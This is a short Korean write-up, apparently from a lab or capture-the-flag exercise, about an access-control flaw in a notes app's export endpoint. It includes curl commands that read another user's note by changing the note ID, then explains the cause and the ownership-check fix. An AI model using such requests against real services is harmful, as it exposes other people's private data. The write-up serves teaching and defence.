## 같은 문서의 두 작업 비교

브리핑의 명령으로 guest 계정의 쿠키를 저장한다. 자기 문서 7은 조회와
내보내기가 모두 성공한다. 목록에는 staff의 문서 42도 있지만 제목과 소유자만
공개되므로 목록에서 복구 코드를 읽을 수는 없다.

```sh
curl -i -b cookies.txt http://app:8000/api/notes/42
curl -i -b cookies.txt -H 'Content-Type: application/json' \
  -d '{"note_id":42}' http://app:8000/api/exports
```

일반 조회는 403으로 거부한다. 취약한 내보내기는 200이며 `export.owner`가
staff인 본문까지 반환한다. 본문의 현재 환경 코드를 제출한다.

```sh
curl -sS -b cookies.txt -H 'Content-Type: application/json' \
  -d '{"note_id":42}' http://app:8000/api/exports | jq -r '.export.body'
```

## 원인과 수정

내보내기는 로그인 여부만 확인하고, 서버 문서의 소유자와 로그인한 사용자를
비교하지 않았다. JSON의 문서 ID를 바꿔도 사용자 권한이 늘어나면 안 된다.
수정한 서버는 내보내기에도 소유권을 확인해 문서 42를 거부한다. 자기 문서 7의
조회와 내보내기, 공개 목록·건강 검사는 유지된다. 각 작업의 정상 기능과 보호
경계를 함께 검사해야 한다.
